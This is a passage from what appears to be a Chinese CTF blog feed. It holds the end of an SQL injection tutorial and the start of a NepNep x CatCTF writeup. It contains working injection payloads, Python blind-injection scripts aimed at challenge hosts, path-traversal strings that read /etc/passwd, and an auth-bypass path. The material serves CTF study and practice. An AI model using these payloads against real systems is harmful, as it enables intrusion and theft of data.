tables;#</span><br></pre></td></tr></table></figure><p>爆列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show xxx from xxxx;#</span><br></pre></td></tr></table></figure><p>查看内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler `表名` open as `a`;handler `a` read next;#</span><br></pre></td></tr></table></figure><p>如果update等被过滤，可以使用sql预处理语句进行拼接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;set @sql=concat(&#x27;u&#x27;,&#x27;pdate `score` listen=99999 where username=&quot;火华&quot;&#x27;);prepare sql_exe from @sql;execute sql_exe;#</span><br></pre></td></tr></table></figure><h2><span id="4布尔盲注"> 4.布尔盲注</span></h2><p>适用于页面只有两种回显结果，没有任何错误回显</p><p>有的时候也可以使用异或符号（页面有1和0的时候）</p><p>直接用脚本跑就行了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys<span class="comment">#头文件</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://1189e07b-be07-49cc-9b96-af07b0b4f9b0.node4.buuoj.cn:81/search.php?id=&quot;</span></span><br><span class="line"></span><br><span class="line">res=<span class="string">&quot;&quot;</span> <span class="comment">#结果</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">1000</span>): <span class="comment">#循环</span></span><br><span class="line">        left=<span class="number">32</span></span><br><span class="line">        right=<span class="number">128</span></span><br><span class="line">        mid=(left + right) //<span class="number">2</span>  <span class="comment">#二分中值</span></span><br><span class="line">        <span class="keyword">while</span> (left &lt; right):</span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr(database(),%d,1))&lt;%d)#&quot;%(i,mid)#爆库</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d)#&quot;%(i,mid)#爆表</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&lt;%d)#&quot;%(i,mid)#爆列</span></span><br><span class="line">                <span class="comment">#payload = url+&quot;1^(ascii(substr((select(group_concat(id,username,password))from(F1naI1y)),%d,1))&lt;%d)#&quot;%(i,mid) #爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环</span></span><br><span class="line">                payload = url+<span class="string">&quot;1^(ascii(substr((select(reverse(group_concat(id,username,password)))from(F1naI1y)),%d,1))&lt;%d)#&quot;</span>%(i,mid) <span class="comment">#爆字段，第一个%d传入i 第二个%d传入mid值，数据库的ascii与mid两个作比较，如果一直&lt; 一直循环，倒序输出</span></span><br><span class="line">                html = requests.get(payload)</span><br><span class="line">                <span class="built_in">print</span>(payload)</span><br><span class="line">                time.sleep(<span class="number">0.04</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&quot;ERROR&quot;</span> <span class="keyword">in</span> html.text: <span class="comment">#这里写入的传参值是&lt; 返回的是ERROR才是对的反应</span></span><br><span class="line">                        right = mid <span class="comment">#如果有延时，右值取中值，再用左+右/2的新区间值与ascii比较(例如，第一次是ascii与80,如果小于80 用ascii与32+80/2=56比较)</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                        left = mid + <span class="number">1</span>  <span class="comment">#如果没有，左值取中值+1，取（81,132）中值比较，ascii值比mid值要大</span></span><br><span class="line">                mid = (left + right) // <span class="number">2</span> <span class="comment">#重复上述过程</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> mid &lt;=<span class="number">32</span> <span class="keyword">or</span> mid &gt;=<span class="number">127</span>:</span><br><span class="line">                <span class="keyword">break</span> <span class="comment">#防止超出ascii码值</span></span><br><span class="line">        res += <span class="built_in">chr</span>(mid-<span class="number">1</span>) <span class="comment">#小于号，值要-1</span></span><br><span class="line">        <span class="built_in">print</span>(res) <span class="comment">#打印</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Result:&quot;</span>,res)</span><br><span class="line"><span class="comment">#print(&quot;Final Result:&quot;,res[::-1]) #采用倒序输出时，将结果正向输出</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">普通的查询语句为：</span><br><span class="line"><span class="comment">#payload=url+&quot;1&#x27; and ascii(substr(database(),%d,1))&lt;%d#&quot;%(i,mid)</span></span><br></pre></td></tr></table></figure><h2><span id="5时间盲注"> 5.时间盲注</span></h2><p>延时注入，页面啥回显都没有的时候，我们需要观察页面的请求时间（</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||if(ascii(substr(database(),1,1))&lt;115,sleep(0.3),1)#</span><br><span class="line">//无延时</span><br><span class="line">1&#x27;||if(ascii(substr(database(),1,1))&lt;116,sleep(0.3),1)#</span><br><span class="line">//有延时</span><br><span class="line">说明库的第一个字符对应为ascii码=115的字符</span><br></pre></td></tr></table></figure><p>编写脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    left = <span class="number">32</span></span><br><span class="line">    right = <span class="number">128</span></span><br><span class="line">    mid = (left + right) // <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(left &lt; right):</span><br><span class="line">        payload = &#123;</span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr(database(),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #爆库</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;wfy_comments&#x27;)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #注意引号</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(group_concat(text))from(wfy_comments)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid)</span></span><br><span class="line">            <span class="comment">#&quot;name&quot; : &quot;114514||if(ascii(substr((select(reverse(group_concat(text)))from(wfy_comments)),%d,1))&lt;%d,sleep(0.3),1)&quot;%(i,mid) #同样的倒置输出</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        times = time.time() <span class="comment">#发送访问请求前的时间</span></span><br><span class="line">        html = requests.post(url,data=payload)</span><br><span class="line">        timee = time.time() <span class="comment">#发送访问后的时间</span></span><br><span class="line">        keep = timee - times <span class="comment">#当然是大-小</span></span><br><span class="line">        time.sleep(<span class="number">0.2</span>) <span class="comment">#防止429</span></span><br><span class="line">        <span class="keyword">if</span> keep &gt; <span class="number">2</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            left = mid + <span class="number">1</span></span><br><span class="line">        mid = (left + right) //<span class="number">2</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res+=<span class="built_in">chr</span>(mid-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Final Results:&quot;</span>,res) <span class="comment">#输出最终结果</span></span><br><span class="line"><span class="comment">#print(&quot;Final Results:&quot;,res[::-1]) #如果选择倒序，选这个</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据注入类型的不同，前面的查询需要修改的（</p><h2><span id="6headers注入"> 6.headers注入</span></h2><p>就是利用上面的方式，换了个注入点…</p><p>例如user-agents（sqli-labs的less-18）</p><p>cookies</p><p>referer</p><p>X-Forwarded-For</p><h2><span id="7宽字节注入"> 7.宽字节注入：</span></h2><p>宽字节是多个字节宽度（&gt;1）的编码（GBK,gb2312…）</p><p>汉字就是宽字节编码</p><p>有些时候传入的参数（单引号）会被addslashes()函数转义，添加反斜杠，但是又因为设定字符集为gbk，导致宽字节的注入</p><p>要将反斜杠转义处理掉的方式有：</p><ul><li>让（\）失去作用</li><li>让（\）的编码和另一个编码组合成两字节的编码（使得反斜杠消失）</li></ul><p>第二种方法就是宽字节注入：</p><ul><li>单引号的编码是%27</li><li>反斜杠的编码是%5c</li></ul><p>所以我们只需要在单引号前加上%df，此时转义后的反斜杠(%5c)与%df就会组成一个汉字：運(运的繁体,%df%5c)</p><p>也就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df&#x27; union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>这个时候查询语句就会变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1運&#x27; union select 1,2,3%23</span><br></pre></td></tr></table></figure><p>剩下的只需要和联合查询一样的地方即可，在前面的单引号添加%df</p><p>在爆列名时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;xxxx&#x27;</span><br><span class="line">后面的单引号也会转义，这个时候我们可以将xxxx使用hex编码，然后0x</span><br><span class="line">例如users=7573657273</span><br><span class="line">就写成</span><br><span class="line">1%df&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=0x7573657273</span><br></pre></td></tr></table></figure><h2><span id="8二次注入"> 8.二次注入</span></h2><p>第一次注册等操作没有注入点，但是第二次操作代入了第一次操作的语句，导致sql注入（</p><p>也就是说，我们提前构造好的语句成功储存进入数据库了，然后第二次操作（例如修改密码）中调用了第一次操作的语句，使得sql语句被执行</p><p>…</p><p>感觉好像还是没解释好，就是</p><p>第一次操作中，我们成功将sql语句储存入数据库中了</p><p>第二次操作中，数据库调用了该sql语句，导致sql语句被执行，形成二次注入(?)</p><h3><span id="rctf2015-easysql"> [RCTF2015] EasySQL</span></h3><p>例如该题就是二次注入：</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/1.png" class title="awa"><p>需要我们注册一个账户：</p><p>尝试注册一个叫1’的账户，注册成功，此处没有注入点</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/2.png" class title="bwb"><p>发现能修改密码，这种先注册再修改密码的操作很可能有二次注入</p><p>发现同样没有任何问题…</p><p>可能是单引号的问题，尝试换成双引号再注册一个用户</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/3.png" class title="cwc"><p>然后修改密码，发现报错：</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/4.png" class title="dwd"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;1&quot;&quot; and pwd=&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure><p>说明是双引号型的二次注入，并且有报错，可以使用报错注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注册账户：</span><br><span class="line">1&quot; and updatexml(1,concat(&#x27;~&#x27;,database()),3)#</span><br></pre></td></tr></table></figure><p>回显 invalid string，说明有过滤</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/5.png" class title="ewe"><p>可能是过滤了空格，所以我们使用括号替代空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;and(updatexml(1,concat(&#x27;~&#x27;,database()),3))#</span><br></pre></td></tr></table></figure><p>发现还是回显invalid string</p><p>所以有可能也过滤了and，使用&amp;&amp;替代空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;(updatexml(1,concat(&#x27;~&#x27;,database()),3))#</span><br></pre></td></tr></table></figure><p>注册成功，然后修改密码</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/6.png" class title="ewe"><p>爆出库名web_sqli</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/7.png" class title="fwf"><p>注册用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),3)#</span><br></pre></td></tr></table></figure><p>然后修改密码，爆出表名：article flag users</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/8.png" class title="gwg"><p>注册用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),3)#</span><br></pre></td></tr></table></figure><p>然后修改密码，爆列名</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/9.png" class title="hwh"><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/10.png" class title="iwi"><p>注册用户</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(flag))from(flag))),3)#</span><br></pre></td></tr></table></figure><p>爆flag</p><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/11.png" class title="jwj"><p>发现flag并不在flag表内，回去看users表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),3)#</span><br></pre></td></tr></table></figure><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/12.png" class title="kwk"><p>发现real_flag_1s_her</p><p>然后尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(real_flag_1s_her))from(users))),3)#</span><br></pre></td></tr></table></figure><p>然后报错了… 没有这一列</p><p>突然才意识到报错注入有32个字符长度的限制，</p><p>尝试倒序查看列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(reverse(column_name)))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),3)#</span><br></pre></td></tr></table></figure><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/13.png" class title="lwl"><p>果然，列名是real_flag_1s_here</p><p>然后爆flag：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(real_flag_1s_here))from(users))),3)#</span><br></pre></td></tr></table></figure><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/14.png" class title="mwm"><p>发现很多xxx，列名内有很多xxx，占用了32个字符长度</p><ul><li>regexp函数：正则匹配，返回特定字符串</li><li>flag的格式就是flag{xxx}</li></ul><p>所以只需要匹配含有f的字符串即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),3)#</span><br></pre></td></tr></table></figure><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/15.png" class title="nwn"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;&amp;&amp;updatexml(1,concat(&#x27;~&#x27;,(select(group_concat(reverse(real_flag_1s_here)))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),3)#</span><br></pre></td></tr></table></figure><img src="/2023/01/10/%E7%9C%8B%E7%9C%8Bsql%E6%B3%A8%E5%85%A5/16.png" class title="qwq"><p>组合一下就行了，注意重复的地方</p><h2><span id="9无列名注入"> 9.无列名注入</span></h2><p>适用于information_schema表被过滤的情况</p><p>爆库名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(database_name) from mysql.innodb_table_stats where 1=&#x27;1</span><br></pre></td></tr></table></figure><p>使用mysql.innodb_table_stats时，不储存列名</p><p>爆表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where 1=&#x27;1</span><br></pre></td></tr></table></figure><p>对列的处理：</p><ul><li>先判断该表内有几列</li><li>然后给列都取一个名，然后读取这个名字的内容</li></ul><p>判断列数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27; union select 1,2,(select group_concat(1) from database.table)&#x27;</span><br></pre></td></tr></table></figure><p>database.table为数据库名.表名</p><p>回显了多少个1就说明有几列</p><p>例如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(1)/**/from/**/ctftraining.flag)&#x27;</span><br></pre></td></tr></table></figure><p>给列取名字读取：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(b)/**/from/**/(select/**/1/**/as/**/b/**/union/**/select/**/*/**/from/**/ctftraining.flag)a)&#x27;</span><br><span class="line"></span><br><span class="line">/*选择ctftraining.flag内的第一列取名为b并且读取b*/</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2><span id="10insert注入"> 10.insert注入</span></h2><p>SQL语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table VALUES(&#x27;val1&#x27;,&#x27;val2&#x27;)</span><br></pre></td></tr></table></figure><p>此时构造语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or xxxx or&#x27;</span><br></pre></td></tr></table></figure><p>语句就会变成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into table VALUES(&#x27;bob&#x27; or xxxxx or&#x27;&#x27;)</span><br></pre></td></tr></table></figure><p>xxxxx可以是报错注入的updatexml，也可以是时间盲注的语句，取决于你用何种注入方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;||if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&lt;127,sleep(0.3),1)||&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or updatexml(1,concat(&#x27;~&#x27;,database()),3) or&#x27;</span><br></pre></td></tr></table></figure><h2><span id="11join报错注入"> 11.join+报错注入</span></h2><p><strong>updated in 2023/3/11</strong></p><p>利用重复查询相同表的方法来爆数据：</p><p>sql语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from 表 a join 表 b)c  //爆表的第一列</span><br><span class="line">select * from(select * from 表 a join 表 b using(第一列列名))c //爆第二个列名</span><br><span class="line">select * from(select * from 表 a join 表 b using(第一列列名,第二列列名))c //爆第三个列名</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>搭配报错注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; || extractvalue(1,concat(0x7e,(select * from (select * from output a join output b)c)))#</span><br><span class="line">//爆出output表的第一个列名</span><br><span class="line">回显：Duplicate column name &#x27;data&#x27;</span><br></pre></td></tr></table></figure><h1><span id="0x06-结束"> 0x06 结束</span></h1><p>嗯，凑数标题（</p><p>老采集了我</p><hr><p>参考资料：</p><ul><li><a href="http://t.csdn.cn/tPnPY">sql注入详解</a></li><li><a href="http://t.csdn.cn/iubh9">[RCTF2015]EasySQL 1</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;突然发现好久没写博客了，赶紧水一篇（雾）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF Web" scheme="http://example.com/categories/CTF-Web/"/>
    
    
    <category term="SQL_Injection" scheme="http://example.com/tags/SQL-Injection/"/>
    
  </entry>
  
  <entry>
    <title>NepNep x CatCTF    WriteUp</title>
    <link href="http://example.com/2023/01/02/NepNep-x-CatCTF-WriteUp/"/>
    <id>http://example.com/2023/01/02/NepNep-x-CatCTF-WriteUp/</id>
    <published>2023-01-02T03:07:03.000Z</published>
    <updated>2023-03-12T09:43:56.842Z</updated>
    
    <content type="html"><![CDATA[<p>又是被虐爆的一天，太难了</p><span id="more"></span><h2><span id="misc"> Misc</span></h2><h3><span id="meowmeow"> MeowMeow</span></h3><p>将图片拖入WinHex，会发现在文件的后半部分藏有flag</p><img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/1.png" class title="awa"><h3><span id="nepnep-祝你新年快乐啦"> Nepnep 祝你新年快乐啦</span></h3><p>评论区置顶评论：</p><img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/2.png" class title="bwb"><h3><span id="catchcat"> CatchCat</span></h3><p><a href="https://www.gpsvisualizer.com/map_input">GPS Visualizer: Draw a map from a GPS data file</a></p><p>通过这个绘制出猫猫的行动路径，即可获取flag</p><p><s>（为什么这玩意这么难看，这两个题都是考眼力的）</s></p><img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/3.png" class title="cwc"><h2><span id="crypto"> Crypto</span></h2><h3><span id="cats-gift"> Cat’s gift</span></h3><p><strong>将礼物分成了四份，说明结果需要乘4，其中一份是1-1/3+1/5-1/7+…</strong></p><p>这个级数其实就是</p><img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/4.png" class title="dwd"><p>（大抵是这样）</p><p>所以最后的值就是π（所以直接交pi是错的</p><p>看到flag的格式都是食物，所以应该是派</p><h2><span id="web"> Web</span></h2><h3><span id="ez_js"> ez_js</span></h3><p>直接进入**/js/game.js**</p><p>看到下面的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function get_flag()&#123;</span><br><span class="line">alert(&quot;flag地址为/g3t_fl4g&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问/g3t_fl4g即可</p><h3><span id="ezbypass"> ezbypass</span></h3><p><a href="http://cn-sec.com/archives/387212.html">华夏ERP漏洞之授权绕过漏洞+后台命令执行漏洞=未授权命令执行 | CN-SEC 中文网</a></p><p>参考这篇文章，可以绕过验证漏洞直接访问flag.html</p><p>payload:</p><p><strong>/a.css/…/flag.html</strong></p><p>或者**/login.html/…/flag.html**</p><img src="/2023/01/02/NepNep-x-CatCTF-WriteUp/5.png" class title="ewe"><h3><span id="catcat"> Catcat</span></h3><p><a href="https://cloud.tencent.com/developer/article/2070182">蓝帽杯 2022 web/misc writeup - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>进入靶机，点击猫猫</p><p>可以看到url的变化，推测有目录穿越</p><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>成功，所以通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../proc/self/cmdline</span><br></pre></td></tr></table></figure><p>查看当前进程，<a href="http://xn--app-4g6ey61e.py">回显app.py</a></p><p>通过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=../../../../../../../../app/app.py</span><br></pre></td></tr></table></figure><p>获取到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b&amp;<span class="comment">#39;import os\nimport uuid\nfrom flask import Flask, request, session, render_template, Markup\nfrom cat import cat\n\nflag = &amp;#34;&amp;#34;\napp = Flask(\n    __name__,\n    static_url_path=\&amp;#39;/\&amp;#39;, \n    static_folder=\&amp;#39;static\&amp;#39; \n)\napp.config[\&amp;#39;SECRET_KEY\&amp;#39;] = str(uuid.uuid4()).replace(&amp;#34;-&amp;#34;, &amp;#34;&amp;#34;) + &amp;#34;*abcdefgh&amp;#34;\nif os.path.isfile(&amp;#34;/flag&amp;#34;):\n    flag = cat(&amp;#34;/flag&amp;#34;)\n    os.remove(&amp;#34;/flag&amp;#34;)\n\n@app.route(\&amp;#39;/\&amp;#39;, methods=[\&amp;#39;GET\&amp;#39;])\ndef index():\n    detailtxt = os.listdir(\&amp;#39;./details/\&amp;#39;)\n    cats_list = []\n    for i in detailtxt:\n        cats_list.append(i[:i.index(\&amp;#39;.\&amp;#39;)])\n        \n    return render_template(&amp;#34;index.html&amp;#34;, cats_list=cats_list, cat=cat)\n\n\n\n@app.route(\&amp;#39;/info\&amp;#39;, methods=[&amp;#34;GET&amp;#34;, \&amp;#39;POST\&amp;#39;])\ndef info():\n    filename = 